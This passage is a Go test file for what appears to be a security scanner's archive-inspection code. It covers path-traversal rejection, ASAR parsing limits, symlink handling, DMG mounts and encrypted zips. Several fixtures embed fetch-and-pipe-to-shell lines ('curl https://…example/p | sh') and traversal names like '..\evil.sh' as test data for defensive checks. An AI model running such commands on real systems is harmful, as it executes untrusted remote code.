package artifact

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/flate"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"hash/crc32"
	"os"
	"path/filepath"
	"reflect"
	"sort"
	"strconv"
	"strings"
	"testing"
)

func TestSourceRoleNormalizesArchiveBoundaries(t *testing.T) {
	tests := []struct {
		logical string
		kind    string
		want    string
	}{
		{logical: "sample.zip!docs/example.py", kind: "text", want: "documentation"},
		{logical: "sample.zip!tests/example.py", kind: "text", want: "test"},
		{logical: "sample.zip!testdata/example.py", kind: "text", want: "fixture"},
		{logical: "sample.zip!node_modules/pkg/index.js", kind: "script", want: "vendor"},
		{logical: "sample.zip!build/out.js", kind: "script", want: "generated/build"},
		{logical: "sample.zip!src/main.py", kind: "script", want: "runtime"},
		{logical: "node_modules/pkg/index.js", kind: "script", want: "vendor"},
		{logical: "docs/example.py", kind: "text", want: "documentation"},
	}
	for _, test := range tests {
		t.Run(test.logical, func(t *testing.T) {
			if got := sourceRole(test.logical, test.kind, false); got != test.want {
				t.Fatalf("sourceRole(%q, %q) = %q, want %q", test.logical, test.kind, got, test.want)
			}
		})
	}
}

func TestCleanArchiveNameRejectsBackslashTraversal(t *testing.T) {
	if _, ok := cleanArchiveName(`..\evil.sh`); ok {
		t.Fatal("backslash traversal path should be rejected")
	}
}

func TestDetectBinaryPlist(t *testing.T) {
	kind, media := Detect("AppSettings.plist", []byte("bplist00fixture"), false)
	if kind != "plist" || media != "application/x-apple-binary-plist" {
		t.Fatalf("Detect(binary plist) = %s %s", kind, media)
	}
}

func TestCleanArchiveNameRejectsParentDirectory(t *testing.T) {
	for _, name := range []string{"..", "a/../..", "a/../evil.sh"} {
		if _, ok := cleanArchiveName(name); ok {
			t.Fatalf("parent directory archive path %q should be rejected", name)
		}
	}
}

func TestCleanArchiveNameRejectsControlCharacters(t *testing.T) {
	for _, name := range []string{"good\x00bad", "good\nbad"} {
		if _, ok := cleanArchiveName(name); ok {
			t.Fatalf("control character archive path %q should be rejected", name)
		}
	}
}

func TestCleanArchiveNameAllowsMacOSCustomIconName(t *testing.T) {
	got, ok := cleanArchiveName("Example.app/Icon\r")
	if !ok {
		t.Fatal("macOS custom icon archive path should be accepted")
	}
	if got != "Example.app/Icon#015" {
		t.Fatalf("cleanArchiveName() = %q, want Example.app/Icon#015", got)
	}
	for _, name := range []string{"Icon\r/evil.sh", "bad\rname", "Icon\n"} {
		if got, ok := cleanArchiveName(name); ok {
			t.Fatalf("nearby control-character path %q should be rejected, got %q", name, got)
		}
	}
}

func TestCleanArchiveNameRejectsWindowsDrivePaths(t *testing.T) {
	for _, name := range []string{`C:\Users\Public\evil.sh`, "C:/Users/Public/evil.sh", "c:relative\\evil.sh", "./C:/Users/Public/evil.sh"} {
		if _, ok := cleanArchiveName(name); ok {
			t.Fatalf("Windows drive-prefixed archive path %q should be rejected", name)
		}
	}
}

func TestCleanArchiveNameNormalizesBackslashSeparators(t *testing.T) {
	got, ok := cleanArchiveName(`Scripts\postinstall`)
	if !ok {
		t.Fatal("ordinary backslash-separated archive path should be accepted")
	}
	if got != "Scripts/postinstall" {
		t.Fatalf("cleanArchiveName() = %q, want Scripts/postinstall", got)
	}
}

func TestInspectAsarRejectsTraversalBeforeVirtualExtraction(t *testing.T) {
	data, err := writeTestAsar(map[string][]byte{`..\evil.sh`: []byte("echo no\n")})
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "sample.asar")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Graph.Nodes) != 1 {
		t.Fatalf("unsafe ASAR entry should not become an artifact node: %#v", result.Graph.Nodes)
	}
	got := strings.Join(result.Diagnostics, "\n")
	if !strings.Contains(got, "rejected unsafe archive path") {
		t.Fatalf("missing unsafe path diagnostic: %#v", result.Diagnostics)
	}
}

func TestInspectAsarReportsUnavailableUnpackedEntry(t *testing.T) {
	data, err := writeTestAsarRaw(map[string]any{
		"files": map[string]any{
			"native.node": map[string]any{
				"size":     123,
				"unpacked": true,
			},
		},
	}, nil)
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "sample.asar")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "sample.asar!native.node")
	if node == nil || node.AnalyzeStatus != "skipped" {
		t.Fatalf("unpacked ASAR sidecar should become a skipped node: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "skipped unpacked asar entry") {
		t.Fatalf("unpacked ASAR node should explain skipped coverage: %#v", node)
	}
	got := strings.Join(result.Diagnostics, "\n")
	if !strings.Contains(got, "skipped unpacked asar entry") {
		t.Fatalf("missing unpacked entry diagnostic: %#v", result.Diagnostics)
	}
}

func TestInspectAsarRejectsOutOfBoundsEntry(t *testing.T) {
	data, err := writeTestAsarRaw(map[string]any{
		"files": map[string]any{
			"evil.sh": map[string]any{
				"offset": "9223372036854775807",
				"size":   1,
			},
		},
	}, []byte("x"))
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "sample.asar")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "sample.asar!evil.sh")
	if node == nil || node.AnalyzeStatus != "skipped" {
		t.Fatalf("out-of-bounds ASAR entry should become a skipped node: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "invalid asar bounds") {
		t.Fatalf("out-of-bounds ASAR node should explain skipped coverage: %#v", node)
	}
	got := strings.Join(result.Diagnostics, "\n")
	if !strings.Contains(got, "sample.asar!evil.sh: invalid asar bounds") {
		t.Fatalf("missing ASAR bounds diagnostic: %#v", result.Diagnostics)
	}
}

func TestFlattenAsarStopsAtEntryLimit(t *testing.T) {
	header := asarHeader{Files: map[string]asarEntry{}}
	for i := 0; i < 3; i++ {
		header.Files[fmt.Sprintf("file-%d.js", i)] = asarEntry{Offset: strconv.Itoa(i), Size: 1}
	}

	entries, limited := flattenAsar(header, 2)
	if !limited {
		t.Fatal("flattenAsar should report a limit hit")
	}
	if len(entries) != 2 {
		t.Fatalf("flattenAsar returned %d entries, want 2", len(entries))
	}
	if entries[0].Name != "file-0.js" || entries[1].Name != "file-1.js" {
		t.Fatalf("flattenAsar should remain deterministic: %#v", entries)
	}
}

func TestFlattenAsarCountsDirectoriesAgainstEntryLimit(t *testing.T) {
	header := asarHeader{Files: map[string]asarEntry{
		"a-dir": {Files: map[string]asarEntry{
			"first.js":  {Offset: "0", Size: 1},
			"second.js": {Offset: "1", Size: 1},
		}},
	}}

	entries, limited := flattenAsar(header, 2)
	if !limited {
		t.Fatal("directory and first leaf should exhaust the two-entry work limit")
	}
	if len(entries) != 1 || entries[0].Name != "a-dir/first.js" {
		t.Fatalf("flattenAsar returned an unexpected deterministic prefix: %#v", entries)
	}
}

func TestFlattenAsarBoundsDeepDirectoryTraversalWithoutRecursion(t *testing.T) {
	files := map[string]asarEntry{"leaf.js": {Offset: "0", Size: 1}}
	for i := 0; i < 10000; i++ {
		files = map[string]asarEntry{"dir": {Files: files}}
	}

	entries, limited := flattenAsar(asarHeader{Files: files}, 32)
	if !limited {
		t.Fatal("deep directory traversal should stop at the entry limit")
	}
	if len(entries) != 0 {
		t.Fatalf("leaf beyond the work limit should not be returned: %#v", entries)
	}
}

func TestParseAsarHeaderRejectsDeepJSONBeforeUnmarshal(t *testing.T) {
	header := `{"files":` + strings.Repeat(`{"dir":{"files":`, maxASARHeaderDepth) + `{}` +
		strings.Repeat(`}}`, maxASARHeaderDepth) + `}`
	data := testAsarWithHeaderJSON(t, []byte(header))
	if _, _, err := parseAsarHeader(data); err == nil || !strings.Contains(err.Error(), "nesting depth") {
		t.Fatalf("parseAsarHeader() error = %v, want nesting-depth error", err)
	}
}

func TestParseAsarHeaderRejectsExcessiveStructuralWorkBeforeUnmarshal(t *testing.T) {
	var header strings.Builder
	header.WriteString(`{"files":{}`)
	for range maxASARHeaderTokens + 1 {
		header.WriteString(`,"x":0`)
	}
	header.WriteByte('}')
	if header.Len() > maxASARHeaderBytes {
		t.Fatalf("test header unexpectedly exceeds byte cap: %d", header.Len())
	}
	data := testAsarWithHeaderJSON(t, []byte(header.String()))
	if _, _, err := parseAsarHeader(data); err == nil || !strings.Contains(err.Error(), "structural token limit") {
		t.Fatalf("parseAsarHeader() error = %v, want structural-limit error", err)
	}
}

func TestParseAsarHeaderUsesExactCanonicalMemberNames(t *testing.T) {
	for _, header := range []string{
		`{"Files":{"main.js":{"offset":"0","size":1}}}`,
		`{"FILES":{"main.js":{"offset":"0","size":1}}}`,
	} {
		data := testAsarWithHeaderJSON(t, []byte(header))
		if _, _, err := parseAsarHeader(data); err == nil || !strings.Contains(err.Error(), "missing files map") {
			t.Fatalf("parseAsarHeader(%s) error = %v, want exact-key rejection", header, err)
		}
	}

	data := testAsarWithHeaderJSON(t, []byte(`{"files":{"main.js":{"OFFSET":"0","SIZE":1}}}`))
	header, _, err := parseAsarHeader(data)
	if err != nil {
		t.Fatal(err)
	}
	entry := header.Files["main.js"]
	if entry.Offset != "" || entry.Size != 0 {
		t.Fatalf("case-folded entry metadata was accepted: %+v", entry)
	}
}

func TestDecodeASAREntryUsesExactLinkKeyAndDeterministicErrors(t *testing.T) {
	entry, err := decodeASAREntry([]byte(`{"Link":"evil.js","link":"safe.js","offset":"0","size":1}`))
	if err != nil {
		t.Fatal(err)
	}
	if !entry.HasLink || entry.Link != "safe.js" {
		t.Fatalf("exact link metadata was not retained: %#v", entry)
	}

	multiEntry := []byte(`{"z":{"size":"bad"},"a":{"offset":false,"size":"also-bad"}}`)
	for iteration := 0; iteration < 100; iteration++ {
		_, err := decodeASAREntryMap(multiEntry)
		if err == nil || !strings.Contains(err.Error(), `entry "a": invalid offset`) {
			t.Fatalf("nondeterministic ASAR decode error on iteration %d: %v", iteration, err)
		}
	}
}

func TestInspectASARRepresentsLinkAsSkippedInsteadOfPayloadBytes(t *testing.T) {
	header := map[string]any{"files": map[string]any{
		"main.js": map[string]any{"link": "evil.js", "offset": "0", "size": 12},
		"evil.js": map[string]any{"offset": "0", "size": 12},
	}}
	data, err := writeTestAsarRaw(header, []byte("console.log()"))
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "sample.asar")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	link := artifactNodeByLogical(result.Graph.Nodes, "sample.asar!main.js")
	if link == nil || link.Kind != "symlink" || link.AnalyzeStatus != "skipped" {
		t.Fatalf("ASAR link was not represented as a skipped link: %#v", link)
	}
	if contentByLogical(result.Contents, "sample.asar!main.js") != nil {
		t.Fatalf("ASAR link metadata was analyzed as payload bytes: %#v", result.Contents)
	}
}

func TestParseAsarHeaderRequiresCanonicalPickleEnvelope(t *testing.T) {
	valid, err := writeTestAsar(map[string][]byte{"main.js": []byte("x")})
	if err != nil {
		t.Fatal(err)
	}
	tests := map[string]func([]byte){
		"outer-size": func(data []byte) { binary.LittleEndian.PutUint32(data[0:4], 8) },
		"inner-size": func(data []byte) { binary.LittleEndian.PutUint32(data[8:12], 1) },
		"padding": func(data []byte) {
			headerSize := binary.LittleEndian.Uint32(data[4:8])
			jsonSize := binary.LittleEndian.Uint32(data[12:16])
			padding := data[16+jsonSize : 8+headerSize]
			if len(padding) == 0 {
				t.Skip("fixture happened to need no Pickle padding")
			}
			padding[0] = 1
		},
	}
	for name, mutate := range tests {
		t.Run(name, func(t *testing.T) {
			malformed := append([]byte(nil), valid...)
			mutate(malformed)
			if _, _, err := parseAsarHeader(malformed); err == nil {
				t.Fatal("malformed Pickle envelope was accepted")
			}
		})
	}
}

func TestFlattenAsarRejectsNoncanonicalPathComponents(t *testing.T) {
	for _, component := range []string{"", ".", "..", "a/b", `a\\b`, "bad\x00name", "bad\nname"} {
		if canonicalASARComponent(component) {
			t.Fatalf("canonicalASARComponent(%q) = true", component)
		}
		header := asarHeader{Files: map[string]asarEntry{component: {Offset: "0", Size: 1}}}
		entries, _ := flattenAsar(header, 10)
		if len(entries) != 1 || !entries[0].UnsafeName {
			t.Fatalf("noncanonical component %q was not rejected: %#v", component, entries)
		}
	}
}

func TestNoArchivesReportsSkippedExpansion(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sample.zip")
	if err := os.WriteFile(path, testZipFile(t, "install.sh", []byte("curl https://no-archive.example/p | sh\n")), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{DisableContainerExpansion: true})
	if err != nil {
		t.Fatal(err)
	}
	if artifactNodeByLogical(result.Graph.Nodes, "sample.zip!install.sh") != nil {
		t.Fatalf("disabled container expansion should not model nested entries: %#v", result.Graph.Nodes)
	}
	if !strings.Contains(strings.Join(result.Diagnostics, "\n"), "container expansion skipped by --expand-containers=false") {
		t.Fatalf("missing disabled-container-expansion diagnostic: %#v", result.Diagnostics)
	}
	root := artifactNodeByLogical(result.Graph.Nodes, "sample.zip")
	if root == nil || root.AnalyzeStatus != "partial" || !strings.Contains(root.CoverageDetail, "--expand-containers=false") {
		t.Fatalf("disabled archive expansion must be explicit structured coverage: %#v", root)
	}
}

func TestNestedArchiveDepthLimitMarksStoppedContainerPartial(t *testing.T) {
	path := filepath.Join(t.TempDir(), "outer.zip")
	nested := testZipFile(t, "payload.sh", []byte("echo bounded\n"))
	if err := os.WriteFile(path, testZipFile(t, "nested.zip", nested), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{MaxArchiveDepth: 1})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "outer.zip!nested.zip")
	if node == nil || node.AnalyzeStatus != "partial" || !strings.Contains(node.CoverageDetail, "archive depth limit 1 reached") {
		t.Fatalf("depth-stopped nested archive must be partial: %#v", node)
	}
	if artifactNodeByLogical(result.Graph.Nodes, "outer.zip!nested.zip!payload.sh") != nil {
		t.Fatalf("content beyond the configured archive depth was modeled: %#v", result.Graph.Nodes)
	}
}

func TestOversizedFileUsesPrefixForTypeDetection(t *testing.T) {
	path := filepath.Join(t.TempDir(), "large.bin")
	data := append([]byte{0xcf, 0xfa, 0xed, 0xfe}, bytes.Repeat([]byte{0}, 32)...)
	if err := os.WriteFile(path, data, 0o755); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{MaxFileBytes: 8})
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Graph.Nodes) != 1 {
		t.Fatalf("nodes = %#v", result.Graph.Nodes)
	}
	node := result.Graph.Nodes[0]
	if node.Kind != "macho" || node.AnalyzeStatus != "partial" {
		t.Fatalf("oversized file should still be typed from header: %#v", node)
	}
	if len(result.Contents) != 0 {
		t.Fatalf("oversized file content should not be queued for extraction: %#v", result.Contents)
	}
}

func TestDirectoryDepthLimitSkipsDeeperFilesystemDirectories(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "root.sh"), []byte("echo root\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	level1 := filepath.Join(root, "a")
	level2 := filepath.Join(level1, "b")
	if err := os.MkdirAll(level2, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(level1, "visible.sh"), []byte("echo visible\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(level2, "hidden.sh"), []byte("echo hidden\n"), 0o700); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(root, Options{MaxDirectoryDepth: 1})
	if err != nil {
		t.Fatal(err)
	}
	rootName := filepath.Base(root)
	if contentByLogical(result.Contents, rootName+"/a/visible.sh") == nil {
		t.Fatalf("file within directory depth should be analyzed: %#v", result.Contents)
	}
	if contentByLogical(result.Contents, rootName+"/a/b/hidden.sh") != nil {
		t.Fatalf("file beyond directory depth should not be queued: %#v", result.Contents)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, rootName+"/a/b")
	if node == nil || node.Kind != "directory" || node.AnalyzeStatus != "skipped" {
		t.Fatalf("deep directory should be represented as skipped: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "directory depth limit 1 reached") {
		t.Fatalf("skipped directory should explain depth limit: %#v", node)
	}
	if !strings.Contains(strings.Join(result.Diagnostics, "\n"), rootName+"/a/b: directory depth limit 1 reached") {
		t.Fatalf("missing depth diagnostic: %#v", result.Diagnostics)
	}
}

func TestMacOSVolumeMetadataDirectoryIsSkipped(t *testing.T) {
	root := t.TempDir()
	metadata := filepath.Join(root, ".fseventsd")
	if err := os.MkdirAll(metadata, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(metadata, "0000000000000001"), []byte("not a tar archive"), 0o600); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(root, Options{})
	if err != nil {
		t.Fatal(err)
	}
	rootName := filepath.Base(root)
	node := artifactNodeByLogical(result.Graph.Nodes, rootName+"/.fseventsd")
	if node == nil || node.Kind != "directory" || node.AnalyzeStatus != "skipped" {
		t.Fatalf("volume metadata directory should be represented as skipped: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "macOS volume metadata") {
		t.Fatalf("skipped volume metadata should explain why it was skipped: %#v", node)
	}
	if contentByLogical(result.Contents, rootName+"/.fseventsd/0000000000000001") != nil {
		t.Fatalf("volume metadata children should not be queued: %#v", result.Contents)
	}
	if strings.Contains(strings.Join(result.Diagnostics, "\n"), "tar parse failed") {
		t.Fatalf("volume metadata should not be parsed as content: %#v", result.Diagnostics)
	}
}

func TestInspectRootSymlinkIsNotFollowed(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "target.sh")
	link := filepath.Join(dir, "link.sh")
	if err := os.WriteFile(target, []byte("curl https://symlink.example/payload | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, link); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}

	result, err := InspectPath(link, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Graph.Nodes) != 1 {
		t.Fatalf("symlink root should produce one skipped node: %#v", result.Graph.Nodes)
	}
	node := result.Graph.Nodes[0]
	if node.Kind != "symlink" || node.MediaType != "inode/symlink" {
		t.Fatalf("root symlink should be typed as symlink: %#v", node)
	}
	if node.AnalyzeStatus != "skipped" || !strings.Contains(node.CoverageDetail, "symlink not followed") {
		t.Fatalf("root symlink should be skipped safely: %#v", node)
	}
	if len(result.Contents) != 0 {
		t.Fatalf("symlink target content should not be queued for extraction: %#v", result.Contents)
	}
}

func TestArchiveSymlinksAreNotAnalyzedAsContent(t *testing.T) {
	tests := []struct {
		name string
		data []byte
	}{
		{name: "sample.zip", data: testZipSymlink(t, "install.sh", "curl https://zip-symlink.example/p | sh\n")},
		{name: "sample.tar", data: testTarSymlink(t, "install.sh", "curl https://tar-symlink.example/p | sh\n")},
		{name: "sample.cpio", data: testCPIOSymlink("install.sh", "curl https://cpio-symlink.example/p | sh\n")},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), tt.name)
			if err := os.WriteFile(path, tt.data, 0o600); err != nil {
				t.Fatal(err)
			}
			result, err := InspectPath(path, Options{})
			if err != nil {
				t.Fatal(err)
			}
			logical := tt.name + "!install.sh"
			node := artifactNodeByLogical(result.Graph.Nodes, logical)
			if node == nil || node.Kind != "symlink" || node.AnalyzeStatus != "skipped" {
				t.Fatalf("archive symlink should be a skipped symlink node: %#v", node)
			}
			if !strings.Contains(node.CoverageDetail, "archive symlink not followed") {
				t.Fatalf("archive symlink should explain skipped coverage: %#v", node)
			}
			if contentByLogical(result.Contents, logical) != nil {
				t.Fatalf("archive symlink body should not be queued for extraction: %#v", result.Contents)
			}
		})
	}
}

func TestTarHardLinksAreNotAnalyzedAsContent(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sample.tar")
	if err := os.WriteFile(path, testTarHardlink(t, "linked.sh", "install.sh"), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "sample.tar!linked.sh")
	if node == nil || node.Kind != "hardlink" || node.MediaType != "inode/hardlink" {
		t.Fatalf("tar hard link should be represented as a skipped hardlink node: %#v", node)
	}
	if node.AnalyzeStatus != "skipped" || !strings.Contains(node.CoverageDetail, "hard link not followed") {
		t.Fatalf("tar hard link should explain skipped coverage: %#v", node)
	}
	if contentByLogical(result.Contents, "sample.tar!linked.sh") != nil {
		t.Fatalf("tar hard link body should not be queued for extraction: %#v", result.Contents)
	}
}

func TestEmptyFilesRemainRepresentedAndHashed(t *testing.T) {
	const emptySHA256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

	root := t.TempDir()
	emptyPath := filepath.Join(root, "empty.sh")
	if err := os.WriteFile(emptyPath, nil, 0o700); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(emptyPath, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(result.Graph.Nodes) != 1 {
		t.Fatalf("empty root file should produce one node: %#v", result.Graph.Nodes)
	}
	if result.Graph.Nodes[0].SHA256 != emptySHA256 {
		t.Fatalf("empty root file SHA256 = %q, want %q", result.Graph.Nodes[0].SHA256, emptySHA256)
	}

	zipPath := filepath.Join(root, "empty.zip")
	if err := os.WriteFile(zipPath, testZipEmptyFile(t, "empty.sh"), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err = InspectPath(zipPath, Options{})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "empty.zip!empty.sh")
	if node == nil {
		t.Fatalf("empty archive file should remain addressable: %#v", result.Graph.Nodes)
		return
	}
	if node.Size != 0 || node.SHA256 != emptySHA256 {
		t.Fatalf("empty archive node should preserve size and SHA256: %#v", node)
	}
	content := contentByLogical(result.Contents, "empty.zip!empty.sh")
	if content == nil || len(content.Data) != 0 {
		t.Fatalf("empty archive content should be queued as an empty file: %#v", result.Contents)
	}

	asarPath := filepath.Join(root, "empty.asar")
	asarData, err := writeTestAsar(map[string][]byte{"empty.js": nil})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(asarPath, asarData, 0o600); err != nil {
		t.Fatal(err)
	}
	result, err = InspectPath(asarPath, Options{})
	if err != nil {
		t.Fatal(err)
	}
	node = artifactNodeByLogical(result.Graph.Nodes, "empty.asar!empty.js")
	if node == nil {
		t.Fatalf("empty ASAR file should remain addressable: %#v", result.Graph.Nodes)
		return
	}
	if node.Size != 0 || node.SHA256 != emptySHA256 {
		t.Fatalf("empty ASAR node should preserve size and SHA256: %#v", node)
	}
}

func TestNestedDMGReportsUnavailableContents(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sample.zip")
	if err := os.WriteFile(path, testZipFile(t, "Installer.dmg", testUDIFImage()), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "sample.zip!Installer.dmg")
	if node == nil || node.Kind != "dmg" {
		t.Fatalf("nested DMG should be represented as a DMG node: %#v", node)
	}
	if node.AnalyzeStatus != "partial" || !strings.Contains(node.CoverageDetail, "contents not inspected") {
		t.Fatalf("uninspected DMG contents should be explicit coverage: %#v", node)
	}
	if !strings.Contains(strings.Join(result.Diagnostics, "\n"), "sample.zip!Installer.dmg: DMG detected; contents not inspected") {
		t.Fatalf("missing nested DMG coverage diagnostic: %#v", result.Diagnostics)
	}
}

func testUDIFImage() []byte {
	data := make([]byte, 512)
	copy(data, "koly")
	return data
}

func TestTransientRootPhysicalPathsAreOmitted(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "Launch"), []byte("#!/bin/sh\necho ok\n"), 0o700); err != nil {
		t.Fatal(err)
	}
	scanner := scanner{
		options:        Options{}.normalized(),
		transientRoots: []string{root},
	}
	volumeID := scanner.addDirectory(root, "sample.dmg!Sample", "", "dmg-volume")
	scanner.scanDirectory(root, "sample.dmg!Sample", volumeID, 0)

	for _, node := range scanner.graph.Nodes {
		if node.PhysicalPath != "" {
			t.Fatalf("transient node %s retained physical path %q", node.LogicalPath, node.PhysicalPath)
		}
	}
	if len(scanner.contents) != 1 {
		t.Fatalf("contents = %#v, want one inspected script", scanner.contents)
	}
	if scanner.contents[0].PhysicalPath != "" {
		t.Fatalf("transient content retained physical path %q", scanner.contents[0].PhysicalPath)
	}
}

func TestTransientRootDoesNotHidePathPrefixSibling(t *testing.T) {
	root := filepath.Join(t.TempDir(), "mount")
	sibling := root + "-sibling"
	scanner := scanner{transientRoots: []string{root}}

	if got := scanner.reportPhysicalPath(filepath.Join(sibling, "file")); got == "" {
		t.Fatal("path with matching prefix outside transient root should remain reportable")
	}
}

func TestTransientRootResolvesSymlinkSpelling(t *testing.T) {
	target := t.TempDir()
	if err := os.WriteFile(filepath.Join(target, "payload"), []byte("ok"), 0o600); err != nil {
		t.Fatal(err)
	}
	linkParent := t.TempDir()
	link := filepath.Join(linkParent, "mount")
	if err := os.Symlink(target, link); err != nil {
		t.Skipf("symlink unavailable: %v", err)
	}
	scanner := scanner{transientRoots: []string{link}}

	if got := scanner.reportPhysicalPath(filepath.Join(target, "payload")); got != "" {
		t.Fatalf("resolved path under symlinked transient root should be hidden, got %q", got)
	}
}

func TestDMGMountPointsParsesHdiutilPlist(t *testing.T) {
	output := []byte(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>system-entities</key>
  <array>
    <dict><key>dev-entry</key><string>/dev/disk4</string></dict>
    <dict><key>mount-point</key><string>/tmp/mount/Beta</string></dict>
    <dict><key>mount-point</key><string>/tmp/mount/Alpha</string></dict>
  </array>
</dict>
</plist>`)
	attachments, err := dmgAttachments(output)
	if err != nil {
		t.Fatal(err)
	}
	mounts := dmgMountPoints(attachments)
	want := []string{"/tmp/mount/Alpha", "/tmp/mount/Beta"}
	if strings.Join(mounts, "\n") != strings.Join(want, "\n") {
		t.Fatalf("unexpected mount points: %#v", mounts)
	}
}

func TestDMGDetachTargetsFallsBackToDevices(t *testing.T) {
	attachments := []dmgAttachment{
		{Device: "/dev/disk5"},
		{Device: "/dev/disk4"},
		{Device: "/dev/disk5"},
	}
	targets := dmgDetachTargets(attachments)
	want := []string{"/dev/disk4", "/dev/disk5"}
	if strings.Join(targets, "\n") != strings.Join(want, "\n") {
		t.Fatalf("unexpected detach targets: %#v", targets)
	}
}

func TestEncryptedZipEntryReportsUnsupportedWithoutReadNoise(t *testing.T) {
	path := filepath.Join(t.TempDir(), "encrypted.zip")
	if err := os.WriteFile(path, testEncryptedZipFile(t, "install.sh", []byte("echo no\n")), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	diagnostics := strings.Join(result.Diagnostics, "\n")
	if !strings.Contains(diagnostics, "encrypted.zip!install.sh: encrypted zip entry not inspected") {
		t.Fatalf("missing encrypted zip diagnostic: %#v", result.Diagnostics)
	}
	if strings.Contains(diagnostics, "flate: corrupt input") || strings.Contains(diagnostics, "read failed") {
		t.Fatalf("encrypted zip should not report low-level read noise: %#v", result.Diagnostics)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "encrypted.zip!install.sh")
	if node == nil || node.AnalyzeStatus != "skipped" {
		t.Fatalf("encrypted zip entry should become a skipped node: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "encrypted zip entry not inspected") {
		t.Fatalf("encrypted zip node should explain skipped coverage: %#v", node)
	}
}

func TestClassicEncryptedZipEntryUsesPassword(t *testing.T) {
	path := filepath.Join(t.TempDir(), "encrypted.zip")
	data := []byte("curl https://encrypted.example/p | sh\n")
	const fixturePassword = "synthetic-fixture-password"
	if err := os.WriteFile(path, testClassicEncryptedZipFile(t, "install.sh", data, fixturePassword, zip.Deflate), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{ZipPassword: fixturePassword})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.Join(result.Diagnostics, "\n"), "encrypted zip entry not inspected") {
		t.Fatalf("encrypted entry should be inspected with correct password: %#v", result.Diagnostics)
	}
	content := contentByLogical(result.Contents, "encrypted.zip!install.sh")
	if content == nil || !bytes.Equal(content.Data, data) {
		t.Fatalf("decrypted content missing: %#v", result.Contents)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "encrypted.zip!install.sh")
	if node == nil || node.AnalyzeStatus != "analyzed" {
		t.Fatalf("decrypted entry should be analyzed: %#v", node)
	}
}

func TestClassicEncryptedZipEntryWrongPasswordIsSkipped(t *testing.T) {
	path := filepath.Join(t.TempDir(), "encrypted.zip")
	const fixturePassword = "synthetic-fixture-password"
	if err := os.WriteFile(path, testClassicEncryptedZipFile(t, "install.sh", []byte("echo no\n"), fixturePassword, zip.Deflate), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{ZipPassword: "wrong"})
	if err != nil {
		t.Fatal(err)
	}
	diagnostics := strings.Join(result.Diagnostics, "\n")
